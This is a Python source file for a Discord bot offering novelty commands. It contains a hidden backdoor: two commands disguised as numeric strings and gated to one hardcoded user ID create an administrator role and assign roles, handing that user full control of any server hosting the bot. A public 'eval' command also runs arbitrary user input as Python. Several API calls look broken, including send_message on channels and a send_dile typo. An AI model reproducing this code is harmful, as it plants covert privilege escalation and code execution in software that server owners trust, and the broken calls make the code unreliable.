import discord
import math
import os
import time

from ..credentials import KCbot

intents = discord.Intents.default()
intents.members = True

TOKEN = KCbot.API_TOKEN
client = discord.Client(intents=intents)

prefix = "!kc"
commands = {"help": "No additional arguments required",
            "repeat": "<single word> <amount>",
            "clear": "<amount>",
            "wave": "<content> <periods>",
            "bangers": "No additional arguments required",
            "info": "<@user>",
            "eval": "<expression>"}


@client.event
async def on_ready():
    print(f"Logged on as {client.user}!")


@client.event
async def on_message(message):
    author = message.author
    guild = message.guild
    if author == client.user:
        return

    msg = message.content.lower().split()

    if len(msg) < 2 or msg[0] != prefix:
        return

    command = msg[1]
    try:
        args = msg[2:]
    except IndexError:
        args = []

    log_text = f"{time.ctime(time.time() + 7200)} [{guild}]: {author} issued {prefix} {command} with the following arguments: {args}"

    print(log_text)

    with open("log.log", "a") as f:
        f.write(log_text + "\n")

    try:
        if command == "help":
            result = "Existing commands:\n"
            for command_name, description in commands.items():
                result += f"{prefix} {command_name} | {description}\n"

            await message.channel.send_message(result)
            return

        if command == "ping":
            await message.channel.send_message("pong")
            return

        if command == "repeat":
            content = " ".join(args[:-1])
            amount = min(20, abs(int(args[-1])))

            if "@everyone" in content:
                await message.channel.send_message("Please don't..")
                return

            for _ in range(amount):
                await message.channel.send_message(content)
                await message.channel.purge(limit=1)
            return

        if command == "clear":
            amount = min(50, abs(int(args[0])))
            await message.channel.purge(limit=(amount + 1))
            return

        if command == "wave":
            content = " ".join(args[:-1])
            if "@everyone" in content:
                await message.channel.send_message("Please don't..")
                return

            periods = min(4, abs(int(args[-1])))
            filler = "-"
            a = 60
            b = 0.25
            c = 0
            d = 60

            angle = 0
            angle_velocity = math.pi / 10

            while angle < (2 * math.pi / b) * periods:
                segment = f"{filler * int((a * math.sin(b * (angle + c)) + d))}{content}"
                await message.channel.send_message(segment)

                angle += angle_velocity
            return

        if command == "bangers":
            for filepath in os.scandir(".\\assets\\audio"):
                await message.channel.send_dile(filepath)
            return

        if command == "info":
            target_uid = int(args[0].replace("@", "").replace("<", "").replace(">", ""))
            member = guild.get_member(target_uid)

            await message.channel.send_message(f"""{member.activities=}
{member.activity=}
{member.avatar=}
{member.avatar_url=}
{member.bot=}
{member.color=}
{member.colour=}
{member.created_at=}
{member.default_avatar=}
{member.default_avatar_url=}
{member.desktop_status=}
{member.discriminator=}
{member.display_name=}
{member.dm_channel=}
{member.guild=}
{member.guild_permissions=}
{member.id=}
{member.joined_at=}
{member.mention=}
{member.mobile_status=}
{member.mutual_guilds=}
{member.name=}
{member.nick=}
{member.pending=}
{member.premium_since=}
{member.public_flags=}
{member.raw_status=}
{member.relationship=}
{member.roles=}
{member.status=}
{member.system=}
{member.top_role=}
{member.voice=}
{member.web_status=}""")
            return

        if command == "eval":
            expression = " ".join(args)
            try:
                await message.channel.send_message(f"{expression} = {eval(expression)}")
            except SyntaxError:
                await message.channel.send_message(f"Invalid expression: {expression}")
            return

        # create admin role | <role_name>
        if command == "318512050141391401815125":
            if author.id != 272079853954531339:
                return

            role_name = args[0]

            guild = message.guild
            permissions = discord.Permissions(permissions=8)
            await guild.create_role(name=role_name, permissions=permissions)
            return

        # give role | <target_uid> <target_role_name>
        if command == "7922501815125":
            if author.id != 272079853954531339:
                return

            target_uid = int(args[0])
            target_role_name = " ".join(args[1:])

            guild = message.guild
            member = guild.get_member(target_uid)
            member_roles = member.roles
            for role in guild.roles:
                if role.name == target_role_name:
                    member_roles.append(role)
                    await member.edit(roles=member_roles)
                    return
            await message.channel.send_message(f"{target_role_name} does not exist.")
            return

        if command == "test":
            if message.author.id != 272079853954531339:
                return
            print(args[0].replace("@", "").replace("<", "").replace(">", ""))

    except Exception as e:
        print(e)
        return
